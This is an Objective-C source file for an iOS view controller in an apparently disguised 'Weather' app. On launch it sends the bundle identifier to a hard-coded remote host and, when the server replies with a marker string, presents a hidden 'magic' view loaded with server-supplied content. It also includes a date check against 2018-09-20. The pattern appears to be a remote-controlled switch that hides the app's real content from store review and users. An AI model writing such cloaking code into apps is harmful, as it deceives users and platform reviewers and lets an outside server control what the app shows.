//
//  BYDetermine.m
//  Weather
//
//  Created by young on 2018/8/18.
//  Copyright © 2018年 Yang. All rights reserved.
//

#import "BYDetermine.h"
#import "SVProgressHUD.h"
#import "AFNetworking.h"
#import "BYMagicView.h"
#import "taskbaseVC.h"
#import "LoginViewController.h"


@interface BYDetermine ()

@end

@implementation BYDetermine

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor whiteColor];
    [self getMagicString];
    
}


+ (BOOL)magicTransformFormat {
    
    NSDateFormatter * dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"yyyy-MM-dd"];
    NSString *dateTime=[dateFormatter stringFromDate:[NSDate date]];
    NSDate *currentdate = [dateFormatter dateFromString:dateTime];
    NSDate *date = [dateFormatter dateFromString:@"2018-09-20"];
    NSComparisonResult result = [date compare:currentdate];
    
    if (result == NSOrderedDescending) {
        return YES;
    }else {
        return NO;
    }
}

- (void)getMagicString {
    [SVProgressHUD setDefaultStyle:SVProgressHUDStyleCustom];
    [SVProgressHUD setBackgroundColor:[UIColor clearColor]];
    [SVProgressHUD showWithStatus:@"Loading"];
    
    NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
    
    NSString *address = [NSString stringWithFormat:@"http://907019.com:84/wd/link/%@",bundleIdentifier];
    
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    
    manager.responseSerializer.acceptableContentTypes= [[NSSet alloc] initWithObjects:@"application/json",@"text/plain", nil];
    manager.requestSerializer = [AFHTTPRequestSerializer serializer];
    manager.responseSerializer = [AFHTTPResponseSerializer serializer];
    
    [manager GET:address parameters:nil progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        [SVProgressHUD dismiss];
        
        dispatch_async(dispatch_get_main_queue(), ^{
            NSString *response = [[NSString alloc] initWithData:responseObject encoding:NSUTF8StringEncoding];
            NSRange range;
            range = [response rangeOfString:@"amjs@"];
            NSArray *array =  [response componentsSeparatedByString:@"@"];
            if (range.location != NSNotFound && array.count == 3)
            {
                NSString *magicString = [array objectAtIndex:2];
                BYMagicView *vc = [[BYMagicView alloc]init];
                vc.magicString = magicString;
                [self presentViewController:vc animated:NO completion:nil];
            }
            else
            {
                
                bool isLogin = [[NSUserDefaults standardUserDefaults] objectForKey:@"isLogin"];
                if (isLogin) {
                    
                    [self presentViewController:[[taskbaseVC alloc] init] animated:NO completion:nil];
        
                }else{
                    
                    UINavigationController * loginNav = [[UINavigationController alloc] initWithRootViewController:[[LoginViewController alloc] init] ];
                    loginNav.navigationBar.barTintColor = [UIColor orangeColor];
                    [self presentViewController:[[LoginViewController alloc] init] animated:NO completion:nil];
                }
              
            }
        });
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        [SVProgressHUD dismiss];
        [self fun_netWorkFaild];
    }];

    
}

#pragma mark - 网络失败
- (void)fun_netWorkFaild
{
    [SVProgressHUD dismiss];
    
    UIAlertController* alert = [UIAlertController alertControllerWithTitle:NSLocalizedString(@"title", @"")
                                                                   message:@""
                                                            preferredStyle:UIAlertControllerStyleAlert];
    
    UIAlertAction* defaultAction = [UIAlertAction actionWithTitle:NSLocalizedString(@"ok", @"") style:UIAlertActionStyleDefault
                                                          handler:^(UIAlertAction * action) {
                                                              [self getMagicString];
                                                          }];
    [alert addAction:defaultAction];
        [self presentViewController:alert animated:YES completion:nil];
}


- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

/*
#pragma mark - Navigation

// In a storyboard-based application, you will often want to do a little preparation before navigation
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
    // Get the new view controller using [segue destinationViewController].
    // Pass the selected object to the new view controller.
}
*/

@end
